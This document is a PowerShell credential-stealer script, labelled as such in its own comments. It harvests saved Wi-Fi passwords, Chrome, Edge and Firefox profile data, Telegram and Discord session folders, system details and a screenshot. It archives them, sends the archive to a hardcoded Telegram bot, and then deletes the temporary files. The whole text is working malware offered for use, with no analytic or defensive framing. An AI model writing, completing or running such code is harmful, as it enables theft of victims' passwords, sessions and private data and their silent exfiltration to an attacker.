# Stealer with test message
$T=$env:TEMP+"\stoler_data"
$Z=$env:TEMP+"\data.zip"
New-Item -Path $T -ItemType Directory -Force|Out-Null

# TEST MESSAGE
try{
    $testUrl="https://api.telegram.org/bot8988262123:AAGULb5xniATGqNC60nCJYrbq_-aIKMHFwQ/sendMessage"
    $testData=@{chat_id='761051987';text='[OK] Stealer started on '+(hostname)}
    $testBody=$testData|ConvertTo-Json
    Invoke-RestMethod -Uri $testUrl -Method Post -Body $testBody -ContentType 'application/json' -ErrorAction SilentlyContinue
}catch{}

# System info
$info=@{
    hostname=(hostname)
    user=$env:USERNAME
    ip=(Invoke-WebRequest -Uri '2ip.io' -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue).Content.Trim()
    os=(Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
}
$info|ConvertTo-Json|Out-File "$T\system_info.txt" -Encoding UTF8

# Wi-Fi passwords (FIXED)
try{
    $profiles=(netsh wlan show profiles|Select-String ':'|%{$_.ToString().Split(':')[1].Trim()})
    $wifiList=@()
    foreach($p in $profiles){
        $pass=(netsh wlan show profile name="`"$p`"" key=clear|Select-String 'Key Content')
        if($pass){
            $password=$pass.ToString().Split(':')[1].Trim()
            $wifiList += "$p : $password"
        }
    }
    $wifiList|Out-File "$T\wifi.txt" -Encoding UTF8
}catch{}

# Browsers
$browsers=@{
    Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
    Firefox="$env:APPDATA\Mozilla\Firefox\Profiles"
}
foreach($b in $browsers.Keys){
    if(Test-Path $browsers[$b]){
        try{
            New-Item -Path "$T\browsers\$b" -Type Dir -Force|Out-Null
            Copy-Item "$($browsers[$b])\*" "$T\browsers\$b" -Recurse -Force -ErrorAction SilentlyContinue
        }catch{}
    }
}

# Telegram
$tg="$env:APPDATA\Telegram Desktop\tdata"
if(Test-Path $tg){
    try{
        Copy-Item $tg "$T\telegram" -Recurse -Force -ErrorAction SilentlyContinue
    }catch{}
}

# Discord
$dc="$env:APPDATA\discord"
if(Test-Path $dc){
    try{
        Copy-Item $dc "$T\discord" -Recurse -Force -ErrorAction SilentlyContinue
    }catch{}
}

# Screenshot
try{
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing -ErrorAction SilentlyContinue
    $screen=[System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap=New-Object System.Drawing.Bitmap $screen.Width,$screen.Height
    $graphics=[System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$screen.Size)
    $bitmap.Save("$T\screenshot.png")
}catch{}

# Archive
try{
    Compress-Archive -Path "$T\*" -DestinationPath $Z -Force -CompressionLevel Optimal -ErrorAction SilentlyContinue
}catch{}

# Send to Telegram
try{
    $url="https://api.telegram.org/bot8988262123:AAGULb5xniATGqNC60nCJYrbq_-aIKMHFwQ/sendDocument"
    $form=New-Object System.Net.Http.MultipartFormDataContent
    $fs=[System.IO.File]::OpenRead($Z)
    $fc=New-Object System.Net.Http.StreamContent($fs)
    $fc.Headers.ContentDisposition=New-Object System.Net.Http.Headers.ContentDispositionHeaderValue('form-data')
    $fc.Headers.ContentDisposition.Name='document'
    $fc.Headers.ContentDisposition.FileName='data.zip'
    $form.Add($fc)
    $form.Add((New-Object System.Net.Http.StringContent('761051987')), 'chat_id')

    $client=New-Object System.Net.Http.HttpClient
    $client.Timeout=[System.TimeSpan]::FromSeconds(60)
    $response=$client.PostAsync($url,$form).Result

    if($response.StatusCode -eq 200){
        'OK'>>$env:TEMP\stealer.log
    }else{
        'Status: '+$response.StatusCode>>$env:TEMP\stealer.log
    }
}catch{
    'SendError: '+$_.Exception.Message>>$env:TEMP\stealer.log
}

# Cleanup
try{
    Remove-Item $T -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $Z -Force -ErrorAction SilentlyContinue
}catch{}
